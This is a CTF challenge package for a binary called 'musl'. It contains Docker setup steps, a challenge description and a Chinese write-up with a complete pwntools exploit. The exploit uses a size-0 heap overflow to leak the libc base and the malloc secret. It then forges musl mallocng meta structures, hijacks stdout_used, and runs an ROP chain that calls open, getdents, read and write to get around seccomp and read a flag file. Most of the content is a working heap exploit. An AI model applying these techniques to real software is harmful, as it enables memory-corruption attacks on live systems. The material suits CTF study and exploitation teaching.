

## Build

```bash
docker build -t "musl" .
```

## Run

```bash
sudo docker run -d -p "0.0.0.0:pub_port:9999" -h "musl" --name="musl" musl
```

`pub_port` 是要向开放的端口。





题目名:   musl

题目环境：ubuntu16.04  musl-1.2.2 libc

题目描述

保存flag的文件名不为flag或者flag.txt，保存flag的路径为/home/ctf/flag/





wp：

漏洞位于add函数中，如果输入的size会0，会导致堆溢出，可以完成泄露libc基址和secret的操作，再通过伪造chunk的offset和index 以及伪造meta，最终完成对stdout_used的劫持。题目使用了seccomp禁用了execve，可以通过orw获得flag，但没有告诉flag名字，所以可以先用getdents探测文件名，然后再进行orw。

python exp.py /home/ctf/flag/

```python
# -*- coding: utf-8 -*
from pwn import *
import sys, getopt

context.log_level = 'debug'
def add(idx,size,content):
    p.sendafter(">>", "1".ljust(0x10,'\x00'))
    p.sendafter("idx?\n",str(idx).ljust(0x10,'\x00'))
    p.sendafter("size?\n",str(size).ljust(0x10,'\x00'))
    p.sendafter("Contnet?\n",content)
def free(idx):
    p.sendafter(">>","2".ljust(0x10,'\x00'))
    p.sendafter("idx?\n",str(idx).ljust(0x10,'\x00'))
def show(idx):
    p.sendafter(">>","3".ljust(0x10,'\x00'))
    p.sendafter("idx?\n",str(idx).ljust(0x10,'\x00'))

def exp(flag_path):
    global p
    p = remote("127.0.0.1",10002)
    
    #1.泄露libc
    add(0,1,b"")
    add(1,1,b"")
    for i in range(2,15):
        add(i,1,b"")

    free(0)
    payload = "A"*0xF+"\n"
    add(0,0,payload)
    show(0)
    p.recvline()
    libcbase = u64(p.recvn(6).ljust(8,b'\x00')) - (0x7fc28eee1d50 - 0x7fc28ec49000)
    malloc_context = libcbase + (0x7fc28eedeae0 - 0x7fc28ec49000)
    stdout_used_ptr = libcbase + (0x7fc28eede450 - 0x7fc28ec49000)
    magic_gadget = libcbase + 0x000000000004a5ae #0x000000000004a5ae :mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]
    poprdiraxret = libcbase + 0x000000000007144e
    poprsiret = libcbase + 0x000000000001b27a
    poprdxret = libcbase + 0x0000000000009328
    syscallret = libcbase + 0x0000000000023711
    ret = libcbase + 0x000000000001689b

    #2.泄露secret
    free(2)
    payload = b"A"*0x10+p64(malloc_context)+b"\n"
    add(2,0,payload)
    show(3)
    p.recvuntil("Content: ")
    secret = u64(p.recvn(8))

    #3.伪造chunk6的offset和index
    chunk_addr = libcbase + (0x7ff9422d4020 - 0x7ff942044000)
    fake_stdout_used = chunk_addr + 0x30
    fake_group = libcbase + (0x7ff9422dcdd0 - 0x7ff942044000)
    free(5)
    payload = p64(libcbase+(0x7f38bb7d6010 - 0x7f38bb545000))#fake group->meta
    payload +=p64(0x000c0c000000000b)
    payload +=p64(libcbase+(0x7ff4266c9df0 - 0x7ff426431000))
    payload +=b"\x00"*5+p8(0)+p16(1)#idx=0 offset=0x10
    add(5,0,payload+b"\n")

    #4.构造fake_stdout_used和fake_meta
    #fake_stdout_used
    payload = flag_path.ljust(0x30,b'\x00')
    payload +=b'\x00'*0x30+p64(chunk_addr + 0x100)#mov rsp, qword ptr [rdi + 0x30]
    payload +=p64(ret)#jmp qword ptr [rdi + 0x38]
    payload +=p64(0)+p64(magic_gadget)
    payload = payload.ljust(0x100,b'\x00')

    #open(flag_path, O_RDONLY | O_DIRECTORY)
    payload +=p64(poprdiraxret)+p64(chunk_addr)+p64(2)
    payload +=p64(poprsiret)+p64(0x10000)+p64(syscallret)
    #getdents(fd, buf, BUF_SIZE)
    payload +=p64(poprdiraxret)+p64(3)+p64(78)
    payload +=p64(poprsiret)+p64(chunk_addr+0x300)
    payload +=p64(poprdxret)+p64(0x100)+p64(syscallret)

    #补全路径
    LEN = len(flag_path)
    payload +=p64(poprdiraxret)+p64(0)+p64(0)
    payload +=p64(poprsiret)+p64(chunk_addr+0x32a-LEN)
    payload +=p64(poprdxret)+p64(LEN)+p64(syscallret)


    #open(flag,0_RDONLY)
    payload +=p64(poprdiraxret)+p64(chunk_addr+0x32a-LEN)+p64(2)
    payload +=p64(poprsiret)+p64(0)+p64(syscallret)
    #read(fd,buf,size)
    payload +=p64(poprdiraxret)+p64(4)+p64(0)
    payload +=p64(poprsiret)+p64(chunk_addr+0x600)
    payload +=p64(poprdxret)+p64(0x30)+p64(syscallret)
    #write(1,buf,size)
    payload +=p64(poprdiraxret)+p64(1)+p64(1)
    payload +=p64(poprsiret)+p64(chunk_addr+0x600)
    payload +=p64(poprdxret)+p64(0x30)+p64(syscallret)
    payload = payload.ljust(0x1000-0x20,b'\x00')

    #fake_meta_area
    payload +=p64(secret)+p64(0)
    #fake_meta
    payload +=p64(fake_stdout_used)+p64(stdout_used_ptr)#prev next
    payload +=p64(fake_group)#mem
    payload +=p32(0x7f-1)+p32(0)#avail_mask=0x7e freed_mask=0
    maplen = 1     
    freeable = 1   
    sizeclass = 1  
    last_idx = 6
    last_value = last_idx | (freeable << 5) | (sizeclass << 6) | (maplen << 12)
    payload +=p64(last_value)+p64(0)
    add(15,0x1500,payload+b"\n")
    #5.劫持stdout_used
    free(6)

    #6.exit(0) => close_file劫持控制流
    p.sendafter(">>",b"4".ljust(0x10,b'\x00'))

    p.send(flag_path)

    p.interactive()

if __name__ == "__main__":
    exp(bytes(sys.argv[1],encoding='utf-8'))
```



